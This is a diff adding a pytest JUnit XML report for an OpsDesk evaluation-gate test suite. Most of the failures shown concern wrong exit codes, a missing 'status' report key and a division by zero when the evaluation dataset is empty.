@@ -1,0 +1,1016 @@
+<?xml version='1.0' encoding='utf-8'?>
+<testsuites name="pytest tests"><testsuite name="pytest" errors="0" failures="37" skipped="0" tests="79" time="8.079" timestamp="2026-10-13T02:21:31.906077+11:00"><testcase classname="tests.qa.test_evaluation_gate" name="test_baseline_gate_passes_with_all_original_samples" time="0.272"><failure message="KeyError: 'status'">tmp_path = PosixPath('/private&lt;TEMP&gt;/pytest/test_baseline_gate_passes_with0')
+
+    def test_baseline_gate_passes_with_all_original_samples(tmp_path):
+        process, report = run_evaluator(tmp_path, baseline_cases())
+        assert process.returncode == 0, process.stderr
+&gt;       assert report["status"] == "passed" and report["gate"]["passed"]
+               ^^^^^^^^^^^^^^^^
+E       KeyError: 'status'
+
+&lt;REPO&gt;/tests/qa/test_evaluation_gate.py:63: KeyError</failure></testcase><testcase classname="tests.qa.test_evaluation_gate" name="test_completed_but_failing_evaluation_returns_one[intent-mismatch]" time="0.250"><failure message="AssertionError: {&quot;at&quot;: &quot;2026-10-12T15:21:32.506580+00:00&quot;, &quot;scope&quot;: &quot;Small self-authored synthetic regression set. Classification tests the deterministic fallback only, not model accuracy. Retrieval reflects the explicitly recorded runtime channels. No held-out or production claim.&quot;, &quot;classification_size&quot;: 24, &quot;intent_correct&quot;: 23, &quot;priority_correct&quot;: 24, &quot;retrieval_size&quot;: 12, &quot;hit_at_4&quot;: 1.0, &quot;mrr&quot;: 0.9444444444444445, &quot;vector_queries&quot;: 0}&#10;  &#10;assert 0 == 1&#10; +  where 0 = CompletedProcess(args=['/Users/shawn/Desktop/OpsDesk/.venv/bin/python', '-c', &quot;\nimport asyncio, runpy, sys\nfrom path...ity_correct&quot;: 24, &quot;retrieval_size&quot;: 12, &quot;hit_at_4&quot;: 1.0, &quot;mrr&quot;: 0.9444444444444445, &quot;vector_queries&quot;: 0}\n', stderr='').returncode">tmp_path = PosixPath('/private&lt;TEMP&gt;/pytest/test_completed_but_failing_eva0')
+fault = 'intent'
+
+    @pytest.mark.parametrize("fault", ["intent", "priority", "retrieval", "mrr"], ids=["intent-mismatch", "priority-mismatch", "retrieval-miss", "rank-threshold"])
+    def test_completed_but_failing_evaluation_returns_one(tmp_path, fault):
+        cases = baseline_cases()
+        args = ()
+        if fault == "intent":
+            cases["classification"][0][1] = "INCIDENT"
+        elif fault == "priority":
+            cases["classification"][0][2] = "P1"
+        elif fault == "retrieval":
+            cases["retrieval"][0][0] = "zzzznevermatchingterm"
+        else:
+            args = ("--min-mrr", "1")
+        process, report = run_evaluator(tmp_path, cases, args)
+&gt;       assert process.returncode == 1, process.stdout + process.stderr
+E       AssertionError: {"at": "2026-10-12T15:21:32.506580+00:00", "scope": "Small self-authored synthetic regression set. Classification tests the deterministic fallback only, not model accuracy. Retrieval reflects the explicitly recorded runtime channels. No held-out or production claim.", "classification_size": 24, "intent_correct": 23, "priority_correct": 24, "retrieval_size": 12, "hit_at_4": 1.0, "mrr": 0.9444444444444445, "vector_queries": 0}
+E         
+E       assert 0 == 1
+E        +  where 0 = CompletedProcess(args=['&lt;REPO&gt;/.venv/bin/python', '-c', "\nimport asyncio, runpy, sys\nfrom path...ity_correct": 24, "retrieval_size": 12, "hit_at_4": 1.0, "mrr": 0.9444444444444445, "vector_queries": 0}\n', stderr='').returncode
+
+&lt;REPO&gt;/tests/qa/test_evaluation_gate.py:84: AssertionError</failure></testcase><testcase classname="tests.qa.test_evaluation_gate" name="test_completed_but_failing_evaluation_returns_one[priority-mismatch]" time="0.299"><failure message="AssertionError: {&quot;at&quot;: &quot;2026-10-12T15:21:32.794876+00:00&quot;, &quot;scope&quot;: &quot;Small self-authored synthetic regression set. Classification tests the deterministic fallback only, not model accuracy. Retrieval reflects the explicitly recorded runtime channels. No held-out or production claim.&quot;, &quot;classification_size&quot;: 24, &quot;intent_correct&quot;: 24, &quot;priority_correct&quot;: 23, &quot;retrieval_size&quot;: 12, &quot;hit_at_4&quot;: 1.0, &quot;mrr&quot;: 0.9444444444444445, &quot;vector_queries&quot;: 0}&#10;  &#10;assert 0 == 1&#10; +  where 0 = CompletedProcess(args=['/Users/shawn/Desktop/OpsDesk/.venv/bin/python', '-c', &quot;\nimport asyncio, runpy, sys\nfrom path...ity_correct&quot;: 23, &quot;retrieval_size&quot;: 12, &quot;hit_at_4&quot;: 1.0, &quot;mrr&quot;: 0.9444444444444445, &quot;vector_queries&quot;: 0}\n', stderr='').returncode">tmp_path = PosixPath('/private&lt;TEMP&gt;/pytest/test_completed_but_failing_eva1')
+fault = 'priority'
+
+    @pytest.mark.parametrize("fault", ["intent", "priority", "retrieval", "mrr"], ids=["intent-mismatch", "priority-mismatch", "retrieval-miss", "rank-threshold"])
+    def test_completed_but_failing_evaluation_returns_one(tmp_path, fault):
+        cases = baseline_cases()
+        args = ()
+        if fault == "intent":
+            cases["classification"][0][1] = "INCIDENT"
+        elif fault == "priority":
+            cases["classification"][0][2] = "P1"
+        elif fault == "retrieval":
+            cases["retrieval"][0][0] = "zzzznevermatchingterm"
+        else:
+            args = ("--min-mrr", "1")
+        process, report = run_evaluator(tmp_path, cases, args)
+&gt;       assert process.returncode == 1, process.stdout + process.stderr
+E       AssertionError: {"at": "2026-10-12T15:21:32.794876+00:00", "scope": "Small self-authored synthetic regression set. Classification tests the deterministic fallback only, not model accuracy. Retrieval reflects the explicitly recorded runtime channels. No held-out or production claim.", "classification_size": 24, "intent_correct": 24, "priority_correct": 23, "retrieval_size": 12, "hit_at_4": 1.0, "mrr": 0.9444444444444445, "vector_queries": 0}
+E         
+E       assert 0 == 1
+E        +  where 0 = CompletedProcess(args=['&lt;REPO&gt;/.venv/bin/python', '-c', "\nimport asyncio, runpy, sys\nfrom path...ity_correct": 23, "retrieval_size": 12, "hit_at_4": 1.0, "mrr": 0.9444444444444445, "vector_queries": 0}\n', stderr='').returncode
+
+&lt;REPO&gt;/tests/qa/test_evaluation_gate.py:84: AssertionError</failure></testcase><testcase classname="tests.qa.test_evaluation_gate" name="test_completed_but_failing_evaluation_returns_one[retrieval-miss]" time="0.291"><failure message="AssertionError: {&quot;at&quot;: &quot;2026-10-12T15:21:33.090645+00:00&quot;, &quot;scope&quot;: &quot;Small self-authored synthetic regression set. Classification tests the deterministic fallback only, not model accuracy. Retrieval reflects the explicitly recorded runtime channels. No held-out or production claim.&quot;, &quot;classification_size&quot;: 24, &quot;intent_correct&quot;: 24, &quot;priority_correct&quot;: 24, &quot;retrieval_size&quot;: 12, &quot;hit_at_4&quot;: 0.9166666666666666, &quot;mrr&quot;: 0.8611111111111112, &quot;vector_queries&quot;: 0}&#10;  &#10;assert 0 == 1&#10; +  where 0 = CompletedProcess(args=['/Users/shawn/Desktop/OpsDesk/.venv/bin/python', '-c', &quot;\nimport asyncio, runpy, sys\nfrom path...4, &quot;retrieval_size&quot;: 12, &quot;hit_at_4&quot;: 0.9166666666666666, &quot;mrr&quot;: 0.8611111111111112, &quot;vector_queries&quot;: 0}\n', stderr='').returncode">tmp_path = PosixPath('/private&lt;TEMP&gt;/pytest/test_completed_but_failing_eva2')
+fault = 'retrieval'
+
+    @pytest.mark.parametrize("fault", ["intent", "priority", "retrieval", "mrr"], ids=["intent-mismatch", "priority-mismatch", "retrieval-miss", "rank-threshold"])
+    def test_completed_but_failing_evaluation_returns_one(tmp_path, fault):
+        cases = baseline_cases()
+        args = ()
+        if fault == "intent":
+            cases["classification"][0][1] = "INCIDENT"
+        elif fault == "priority":
+            cases["classification"][0][2] = "P1"
+        elif fault == "retrieval":
+            cases["retrieval"][0][0] = "zzzznevermatchingterm"
+        else:
+            args = ("--min-mrr", "1")
+        process, report = run_evaluator(tmp_path, cases, args)
+&gt;       assert process.returncode == 1, process.stdout + process.stderr
+E       AssertionError: {"at": "2026-10-12T15:21:33.090645+00:00", "scope": "Small self-authored synthetic regression set. Classification tests the deterministic fallback only, not model accuracy. Retrieval reflects the explicitly recorded runtime channels. No held-out or production claim.", "classification_size": 24, "intent_correct": 24, "priority_correct": 24, "retrieval_size": 12, "hit_at_4": 0.9166666666666666, "mrr": 0.8611111111111112, "vector_queries": 0}
+E         
+E       assert 0 == 1
+E        +  where 0 = CompletedProcess(args=['&lt;REPO&gt;/.venv/bin/python', '-c', "\nimport asyncio, runpy, sys\nfrom path...4, "retrieval_size": 12, "hit_at_4": 0.9166666666666666, "mrr": 0.8611111111111112, "vector_queries": 0}\n', stderr='').returncode
+
+&lt;REPO&gt;/tests/qa/test_evaluation_gate.py:84: AssertionError</failure></testcase><testcase classname="tests.qa.test_evaluation_gate" name="test_completed_but_failing_evaluation_returns_one[rank-threshold]" time="0.258"><failure message="AssertionError: {&quot;at&quot;: &quot;2026-10-12T15:21:33.362046+00:00&quot;, &quot;scope&quot;: &quot;Small self-authored synthetic regression set. Classification tests the deterministic fallback only, not model accuracy. Retrieval reflects the explicitly recorded runtime channels. No held-out or production claim.&quot;, &quot;classification_size&quot;: 24, &quot;intent_correct&quot;: 24, &quot;priority_correct&quot;: 24, &quot;retrieval_size&quot;: 12, &quot;hit_at_4&quot;: 1.0, &quot;mrr&quot;: 0.9444444444444445, &quot;vector_queries&quot;: 0}&#10;  &#10;assert 0 == 1&#10; +  where 0 = CompletedProcess(args=['/Users/shawn/Desktop/OpsDesk/.venv/bin/python', '-c', &quot;\nimport asyncio, runpy, sys\nfrom path...ity_correct&quot;: 24, &quot;retrieval_size&quot;: 12, &quot;hit_at_4&quot;: 1.0, &quot;mrr&quot;: 0.9444444444444445, &quot;vector_queries&quot;: 0}\n', stderr='').returncode">tmp_path = PosixPath('/private&lt;TEMP&gt;/pytest/test_completed_but_failing_eva3')
+fault = 'mrr'
+
+    @pytest.mark.parametrize("fault", ["intent", "priority", "retrieval", "mrr"], ids=["intent-mismatch", "priority-mismatch", "retrieval-miss", "rank-threshold"])
+    def test_completed_but_failing_evaluation_returns_one(tmp_path, fault):
+        cases = baseline_cases()
+        args = ()
+        if fault == "intent":
+            cases["classification"][0][1] = "INCIDENT"
+        elif fault == "priority":
+            cases["classification"][0][2] = "P1"
+        elif fault == "retrieval":
+            cases["retrieval"][0][0] = "zzzznevermatchingterm"
+        else:
+            args = ("--min-mrr", "1")
+        process, report = run_evaluator(tmp_path, cases, args)
+&gt;       assert process.returncode == 1, process.stdout + process.stderr
+E       AssertionError: {"at": "2026-10-12T15:21:33.362046+00:00", "scope": "Small self-authored synthetic regression set. Classification tests the deterministic fallback only, not model accuracy. Retrieval reflects the explicitly recorded runtime channels. No held-out or production claim.", "classification_size": 24, "intent_correct": 24, "priority_correct": 24, "retrieval_size": 12, "hit_at_4": 1.0, "mrr": 0.9444444444444445, "vector_queries": 0}
+E         
+E       assert 0 == 1
+E        +  where 0 = CompletedProcess(args=['&lt;REPO&gt;/.venv/bin/python', '-c', "\nimport asyncio, runpy, sys\nfrom path...ity_correct": 24, "retrieval_size": 12, "hit_at_4": 1.0, "mrr": 0.9444444444444445, "vector_queries": 0}\n', stderr='').returncode
+
+&lt;REPO&gt;/tests/qa/test_evaluation_gate.py:84: AssertionError</failure></testcase><testcase classname="tests.qa.test_evaluation_gate" name="test_invalid_or_missing_input_returns_incomplete[missing-file]" time="0.228"><failure message="AssertionError: Traceback (most recent call last):&#10;    File &quot;&lt;string&gt;&quot;, line 20, in &lt;module&gt;&#10;    File &quot;/Users/shawn/.cache/codex-runtimes/codex-primary-runtime/dependencies/python/lib/python3.12/asyncio/runners.py&quot;, line 195, in run&#10;      return runner.run(main)&#10;             ^^^^^^^^^^^^^^^^&#10;    File &quot;/Users/shawn/.cache/codex-runtimes/codex-primary-runtime/dependencies/python/lib/python3.12/asyncio/runners.py&quot;, line 118, in run&#10;      return self._loop.run_until_complete(task)&#10;             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^&#10;    File &quot;/Users/shawn/.cache/codex-runtimes/codex-primary-runtime/dependencies/python/lib/python3.12/asyncio/base_events.py&quot;, line 691, in run_until_complete&#10;      return future.result()&#10;             ^^^^^^^^^^^^^^^&#10;    File &quot;/private/var/folders/4s/bpjg_6m151l9tgkgc85zfz600000gn/T/opsdesk-phase2a-el0xqr3q/baseline-replica/scripts/evaluate.py&quot;, line 16, in main&#10;      cases = json.loads((PROJECT / &quot;evaluation/cases.json&quot;).read_text(encoding=&quot;utf-8&quot;))&#10;                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^&#10;    File &quot;/Users/shawn/.cache/codex-runtimes/codex-primary-runtime/dependencies/python/lib/python3.12/pathlib.py&quot;, line 1027, in read_text&#10;      with self.open(mode='r', encoding=encoding, errors=errors) as f:&#10;           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^&#10;    File &quot;/Users/shawn/.cache/codex-runtimes/codex-primary-runtime/dependencies/python/lib/python3.12/pathlib.py&quot;, line 1013, in open&#10;      return io.open(self, mode, buffering, encoding, errors, newline)&#10;             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^&#10;  FileNotFoundError: [Errno 2] No such file or directory: '/private/var/folders/4s/bpjg_6m151l9tgkgc85zfz600000gn/T/opsdesk-phase2a-el0xqr3q/pytest/test_invalid_or_missing_input_0/evaluation/cases.json'&#10;  &#10;assert 1 == 2&#10; +  where 1 = CompletedProcess(args=['/Users/shawn/Desktop/OpsDesk/.venv/bin/python', '-c', &quot;\nimport asyncio, runpy, sys\nfrom path...6m151l9tgkgc85zfz600000gn/T/opsdesk-phase2a-el0xqr3q/pytest/test_invalid_or_missing_input_0/evaluation/cases.json\'\n').returncode">tmp_path = PosixPath('/private&lt;TEMP&gt;/pytest/test_invalid_or_missing_input_0')
+cases = None
+
+    @pytest.mark.parametrize("cases", [
+        None, "not-json", {"classification": [], "retrieval": []},
+        {"classification": [["hello", "INVALID", "P3"]], "retrieval": [["VPN", "connectivity.md"]]},
+        {"classification": [["hello", "FAQ"]], "retrieval": [["VPN", "connectivity.md"]]},
+    ], ids=["missing-file", "bad-json", "empty-dataset", "invalid-label", "malformed-row"])
+    def test_invalid_or_missing_input_returns_incomplete(tmp_path, cases):
+        process, report = run_evaluator(tmp_path, cases)
+&gt;       assert process.returncode == 2, process.stdout + process.stderr
+E       AssertionError: Traceback (most recent call last):
+E           File "&lt;string&gt;", line 20, in &lt;module&gt;
+E           File "/Users/shawn/.cache/codex-runtimes/codex-primary-runtime/dependencies/python/lib/python3.12/asyncio/runners.py", line 195, in run
+E             return runner.run(main)
+E                    ^^^^^^^^^^^^^^^^
+E           File "/Users/shawn/.cache/codex-runtimes/codex-primary-runtime/dependencies/python/lib/python3.12/asyncio/runners.py", line 118, in run
+E             return self._loop.run_until_complete(task)
+E                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+E           File "/Users/shawn/.cache/codex-runtimes/codex-primary-runtime/dependencies/python/lib/python3.12/asyncio/base_events.py", line 691, in run_until_complete
+E             return future.result()
+E                    ^^^^^^^^^^^^^^^
+E           File "/private&lt;REPO&gt;/scripts/evaluate.py", line 16, in main
+E             cases = json.loads((PROJECT / "evaluation/cases.json").read_text(encoding="utf-8"))
+E                                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+E           File "/Users/shawn/.cache/codex-runtimes/codex-primary-runtime/dependencies/python/lib/python3.12/pathlib.py", line 1027, in read_text
+E             with self.open(mode='r', encoding=encoding, errors=errors) as f:
+E                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+E           File "/Users/shawn/.cache/codex-runtimes/codex-primary-runtime/dependencies/python/lib/python3.12/pathlib.py", line 1013, in open
+E             return io.open(self, mode, buffering, encoding, errors, newline)
+E                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+E         FileNotFoundError: [Errno 2] No such file or directory: '/private&lt;TEMP&gt;/pytest/test_invalid_or_missing_input_0/evaluation/cases.json'
+E         
+E       assert 1 == 2
+E        +  where 1 = CompletedProcess(args=['&lt;REPO&gt;/.venv/bin/python', '-c', "\nimport asyncio, runpy, sys\nfrom path...6m151l9tgkgc85zfz600000gn/T/opsdesk-phase2a-el0xqr3q/pytest/test_invalid_or_missing_input_0/evaluation/cases.json\'\n').returncode
+
+&lt;REPO&gt;/tests/qa/test_evaluation_gate.py:96: AssertionError</failure></testcase><testcase classname="tests.qa.test_evaluation_gate" name="test_invalid_or_missing_input_returns_incomplete[bad-json]" time="0.224"><failure message="AssertionError: Traceback (most recent call last):&#10;    File &quot;&lt;string&gt;&quot;, line 20, in &lt;module&gt;&#10;    File &quot;/Users/shawn/.cache/codex-runtimes/codex-primary-runtime/dependencies/python/lib/python3.12/asyncio/runners.py&quot;, line 195, in run&#10;      return runner.run(main)&#10;             ^^^^^^^^^^^^^^^^&#10;    File &quot;/Users/shawn/.cache/codex-runtimes/codex-primary-runtime/dependencies/python/lib/python3.12/asyncio/runners.py&quot;, line 118, in run&#10;      return self._loop.run_until_complete(task)&#10;             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^&#10;    File &quot;/Users/shawn/.cache/codex-runtimes/codex-primary-runtime/dependencies/python/lib/python3.12/asyncio/base_events.py&quot;, line 691, in run_until_complete&#10;      return future.result()&#10;             ^^^^^^^^^^^^^^^&#10;    File &quot;/private/var/folders/4s/bpjg_6m151l9tgkgc85zfz600000gn/T/opsdesk-phase2a-el0xqr3q/baseline-replica/scripts/evaluate.py&quot;, line 16, in main&#10;      cases = json.loads((PROJECT / &quot;evaluation/cases.json&quot;).read_text(encoding=&quot;utf-8&quot;))&#10;              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^&#10;    File &quot;/Users/shawn/.cache/codex-runtimes/codex-primary-runtime/dependencies/python/lib/python3.12/json/__init__.py&quot;, line 346, in loads&#10;      return _default_decoder.decode(s)&#10;             ^^^^^^^^^^^^^^^^^^^^^^^^^^&#10;    File &quot;/Users/shawn/.cache/codex-runtimes/codex-primary-runtime/dependencies/python/lib/python3.12/json/decoder.py&quot;, line 338, in decode&#10;      obj, end = self.raw_decode(s, idx=_w(s, 0).end())&#10;                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^&#10;    File &quot;/Users/shawn/.cache/codex-runtimes/codex-primary-runtime/dependencies/python/lib/python3.12/json/decoder.py&quot;, line 356, in raw_decode&#10;      raise JSONDecodeError(&quot;Expecting value&quot;, s, err.value) from None&#10;  json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)&#10;  &#10;assert 1 == 2&#10; +  where 1 = CompletedProcess(args=['/Users/shawn/Desktop/OpsDesk/.venv/bin/python', '-c', &quot;\nimport asyncio, runpy, sys\nfrom path...&quot;Expecting value&quot;, s, err.value) from None\njson.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)\n').returncode">tmp_path = PosixPath('/private&lt;TEMP&gt;/pytest/test_invalid_or_missing_input_1')
+cases = 'not-json'
+
+    @pytest.mark.parametrize("cases", [
+        None, "not-json", {"classification": [], "retrieval": []},
+        {"classification": [["hello", "INVALID", "P3"]], "retrieval": [["VPN", "connectivity.md"]]},
+        {"classification": [["hello", "FAQ"]], "retrieval": [["VPN", "connectivity.md"]]},
+    ], ids=["missing-file", "bad-json", "empty-dataset", "invalid-label", "malformed-row"])
+    def test_invalid_or_missing_input_returns_incomplete(tmp_path, cases):
+        process, report = run_evaluator(tmp_path, cases)
+&gt;       assert process.returncode == 2, process.stdout + process.stderr
+E       AssertionError: Traceback (most recent call last):
+E           File "&lt;string&gt;", line 20, in &lt;module&gt;
+E           File "/Users/shawn/.cache/codex-runtimes/codex-primary-runtime/dependencies/python/lib/python3.12/asyncio/runners.py", line 195, in run
+E             return runner.run(main)
+E                    ^^^^^^^^^^^^^^^^
+E           File "/Users/shawn/.cache/codex-runtimes/codex-primary-runtime/dependencies/python/lib/python3.12/asyncio/runners.py", line 118, in run
+E             return self._loop.run_until_complete(task)
+E                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+E           File "/Users/shawn/.cache/codex-runtimes/codex-primary-runtime/dependencies/python/lib/python3.12/asyncio/base_events.py", line 691, in run_until_complete
+E             return future.result()
+E                    ^^^^^^^^^^^^^^^
+E           File "/private&lt;REPO&gt;/scripts/evaluate.py", line 16, in main
+E             cases = json.loads((PROJECT / "evaluation/cases.json").read_text(encoding="utf-8"))
+E                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+E           File "/Users/shawn/.cache/codex-runtimes/codex-primary-runtime/dependencies/python/lib/python3.12/json/__init__.py", line 346, in loads
+E             return _default_decoder.decode(s)
+E                    ^^^^^^^^^^^^^^^^^^^^^^^^^^
+E           File "/Users/shawn/.cache/codex-runtimes/codex-primary-runtime/dependencies/python/lib/python3.12/json/decoder.py", line 338, in decode
+E             obj, end = self.raw_decode(s, idx=_w(s, 0).end())
+E                        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+E           File "/Users/shawn/.cache/codex-runtimes/codex-primary-runtime/dependencies/python/lib/python3.12/json/decoder.py", line 356, in raw_decode
+E             raise JSONDecodeError("Expecting value", s, err.value) from None
+E         json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)
+E         
+E       assert 1 == 2
+E        +  where 1 = CompletedProcess(args=['&lt;REPO&gt;/.venv/bin/python', '-c', "\nimport asyncio, runpy, sys\nfrom path..."Expecting value", s, err.value) from None\njson.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)\n').returncode
+
+&lt;REPO&gt;/tests/qa/test_evaluation_gate.py:96: AssertionError</failure></testcase><testcase classname="tests.qa.test_evaluation_gate" name="test_invalid_or_missing_input_returns_incomplete[empty-dataset]" time="0.239"><failure message="AssertionError: Traceback (most recent call last):&#10;    File &quot;&lt;string&gt;&quot;, line 20, in &lt;module&gt;&#10;    File &quot;/Users/shawn/.cache/codex-runtimes/codex-primary-runtime/dependencies/python/lib/python3.12/asyncio/runners.py&quot;, line 195, in run&#10;      return runner.run(main)&#10;             ^^^^^^^^^^^^^^^^&#10;    File &quot;/Users/shawn/.cache/codex-runtimes/codex-primary-runtime/dependencies/python/lib/python3.12/asyncio/runners.py&quot;, line 118, in run&#10;      return self._loop.run_until_complete(task)&#10;             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^&#10;    File &quot;/Users/shawn/.cache/codex-runtimes/codex-primary-runtime/dependencies/python/lib/python3.12/asyncio/base_events.py&quot;, line 691, in run_until_complete&#10;      return future.result()&#10;             ^^^^^^^^^^^^^^^&#10;    File &quot;/private/var/folders/4s/bpjg_6m151l9tgkgc85zfz600000gn/T/opsdesk-phase2a-el0xqr3q/baseline-replica/scripts/evaluate.py&quot;, line 34, in main&#10;      report = {&quot;at&quot;: datetime.now(timezone.utc).isoformat(), &quot;scope&quot;: &quot;Small self-authored synthetic regression set. Classification tests the deterministic fallback only, not model accuracy. Retrieval reflects the explicitly recorded runtime channels. No held-out or production claim.&quot;, &quot;classification_size&quot;: len(classification), &quot;intent_correct&quot;: sum(item[&quot;expected_intent&quot;] == item[&quot;actual_intent&quot;] for item in classification), &quot;priority_correct&quot;: sum(item[&quot;expected_priority&quot;] == item[&quot;actual_priority&quot;] for item in classification), &quot;retrieval_size&quot;: len(retrieval), &quot;hit_at_4&quot;: sum(item[&quot;rank&quot;] is not None for item in retrieval) / len(retrieval), &quot;mrr&quot;: sum(1 / item[&quot;rank&quot;] if item[&quot;rank&quot;] else 0 for item in retrieval) / len(retrieval), &quot;vector_queries&quot;: sum(item[&quot;vector_used&quot;] for item in retrieval), &quot;classification&quot;: classification, &quot;retrieval&quot;: retrieval}&#10;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^~~~~~~~~~~~~~~~&#10;  ZeroDivisionError: division by zero&#10;  &#10;assert 1 == 2&#10; +  where 1 = CompletedProcess(args=['/Users/shawn/Desktop/OpsDesk/.venv/bin/python', '-c', &quot;\nimport asyncio, runpy, sys\nfrom path...          ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^~~~~~~~~~~~~~~~\nZeroDivisionError: division by zero\n').returncode">tmp_path = PosixPath('/private&lt;TEMP&gt;/pytest/test_invalid_or_missing_input_2')
+cases = {'classification': [], 'retrieval': []}
+
+    @pytest.mark.parametrize("cases", [
+        None, "not-json", {"classification": [], "retrieval": []},
+        {"classification": [["hello", "INVALID", "P3"]], "retrieval": [["VPN", "connectivity.md"]]},
+        {"classification": [["hello", "FAQ"]], "retrieval": [["VPN", "connectivity.md"]]},
+    ], ids=["missing-file", "bad-json", "empty-dataset", "invalid-label", "malformed-row"])
+    def test_invalid_or_missing_input_returns_incomplete(tmp_path, cases):
+        process, report = run_evaluator(tmp_path, cases)
+&gt;       assert process.returncode == 2, process.stdout + process.stderr
+E       AssertionError: Traceback (most recent call last):
+E           File "&lt;string&gt;", line 20, in &lt;module&gt;
+E           File "/Users/shawn/.cache/codex-runtimes/codex-primary-runtime/dependencies/python/lib/python3.12/asyncio/runners.py", line 195, in run
+E             return runner.run(main)
+E                    ^^^^^^^^^^^^^^^^
+E           File "/Users/shawn/.cache/codex-runtimes/codex-primary-runtime/dependencies/python/lib/python3.12/asyncio/runners.py", line 118, in run
+E             return self._loop.run_until_complete(task)
+E                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+E           File "/Users/shawn/.cache/codex-runtimes/codex-primary-runtime/dependencies/python/lib/python3.12/asyncio/base_events.py", line 691, in run_until_complete
+E             return future.result()
+E                    ^^^^^^^^^^^^^^^
+E           File "/private&lt;REPO&gt;/scripts/evaluate.py", line 34, in main
+E             report = {"at": datetime.now(timezone.utc).isoformat(), "scope": "Small self-authored synthetic regression set. Classification tests the deterministic fallback only, not model accuracy. Retrieval reflects the explicitly recorded runtime channels. No held-out or production claim.", "classification_size": len(classification), "intent_correct": sum(item["expected_intent"] == item["actual_intent"] for item in classification), "priority_correct": sum(item["expected_priority"] == item["actual_priority"] for item in classification), "retrieval_size": len(retrieval), "hit_at_4": sum(item["rank"] is not None for item in retrieval) / len(retrieval), "mrr": sum(1 / item["rank"] if item["rank"] else 0 for item in retrieval) / len(retrieval), "vector_queries": sum(item["vector_used"] for item in retrieval), "classification": classification, "retrieval": retrieval}
+E                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^~~~~~~~~~~~~~~~
+E         ZeroDivisionError: division by zero
+E         
+E       assert 1 == 2
+E        +  where 1 = CompletedProcess(args=['&lt;REPO&gt;/.venv/bin/python', '-c', "\nimport asyncio, runpy, sys\nfrom path...          ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^~~~~~~~~~~~~~~~\nZeroDivisionError: division by zero\n').returncode
+
+&lt;REPO&gt;/tests/qa/test_evaluation_gate.py:96: AssertionError</failure></testcase><testcase classname="tests.qa.test_evaluation_gate" name="test_invalid_or_missing_input_returns_incomplete[invalid-label]" time="0.274"><failure message="AssertionError: {&quot;at&quot;: &quot;2026-10-12T15:21:34.327857+00:00&quot;, &quot;scope&quot;: &quot;Small self-authored synthetic regression set. Classification tests the deterministic fallback only, not model accuracy. Retrieval reflects the explicitly recorded runtime channels. No held-out or production claim.&quot;, &quot;classification_size&quot;: 1, &quot;intent_correct&quot;: 0, &quot;priority_correct&quot;: 1, &quot;retrieval_size&quot;: 1, &quot;hit_at_4&quot;: 1.0, &quot;mrr&quot;: 1.0, &quot;vector_queries&quot;: 0}&#10;  &#10;assert 0 == 2&#10; +  where 0 = CompletedProcess(args=['/Users/shawn/Desktop/OpsDesk/.venv/bin/python', '-c', &quot;\nimport asyncio, runpy, sys\nfrom path...rrect&quot;: 0, &quot;priority_correct&quot;: 1, &quot;retrieval_size&quot;: 1, &quot;hit_at_4&quot;: 1.0, &quot;mrr&quot;: 1.0, &quot;vector_queries&quot;: 0}\n', stderr='').returncode">tmp_path = PosixPath('/private&lt;TEMP&gt;/pytest/test_invalid_or_missing_input_3')
+cases = {'classification': [['hello', 'INVALID', 'P3']], 'retrieval': [['VPN', 'connectivity.md']]}
+
+    @pytest.mark.parametrize("cases", [
+        None, "not-json", {"classification": [], "retrieval": []},
+        {"classification": [["hello", "INVALID", "P3"]], "retrieval": [["VPN", "connectivity.md"]]},
+        {"classification": [["hello", "FAQ"]], "retrieval": [["VPN", "connectivity.md"]]},
+    ], ids=["missing-file", "bad-json", "empty-dataset", "invalid-label", "malformed-row"])
+    def test_invalid_or_missing_input_returns_incomplete(tmp_path, cases):
+        process, report = run_evaluator(tmp_path, cases)
+&gt;       assert process.returncode == 2, process.stdout + process.stderr
+E       AssertionError: {"at": "2026-10-12T15:21:34.327857+00:00", "scope": "Small self-authored synthetic regression set. Classification tests the deterministic fallback only, not model accuracy. Retrieval reflects the explicitly recorded runtime channels. No held-out or production claim.", "classification_size": 1, "intent_correct": 0, "priority_correct": 1, "retrieval_size": 1, "hit_at_4": 1.0, "mrr": 1.0, "vector_queries": 0}
+E         
+E       assert 0 == 2
